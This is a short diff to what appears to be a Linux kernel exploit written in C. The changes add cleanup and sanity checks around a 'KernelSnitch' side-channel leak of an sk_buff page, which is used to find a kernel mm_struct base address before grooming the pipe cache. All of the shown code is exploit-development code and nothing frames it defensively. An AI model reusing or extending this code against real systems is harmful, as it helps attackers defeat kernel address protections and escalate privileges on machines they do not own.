@@ -223,8 +223,33 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
     pr_error("pipe KernelSnitch sk_buff page leak failed\n");
+    close_ctx_memfds(&prep);
+    close_ctx_memfds(&spray);
+    close_ctx_memfds(&pre);
+    close_ctx_memfds(&post);
+    free_ctx_storage(&prep);
+    free_ctx_storage(&spray);
+    free_ctx_storage(&pre);
+    free_ctx_storage(&post);
+    free(buf);
+    return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  if ((leaked - base) % MM_STRUCT_SZ != 0 || !is_direct_ptr(base) ||
+      !is_direct_ptr(base + ORDER3_SIZE - 1)) {
+    pr_error("pipe KernelSnitch implausible mm leaked=%016zx base=%016zx\n",
+             leaked, base);
+    close_ctx_memfds(&prep);
+    close_ctx_memfds(&spray);
+    close_ctx_memfds(&pre);
+    close_ctx_memfds(&post);
+    free_ctx_storage(&prep);
+    free_ctx_storage(&spray);
+    free_ctx_storage(&pre);
+    free_ctx_storage(&post);
+    free(buf);
+    return 0;
+  }
 
   shape_pipe_cache();
 
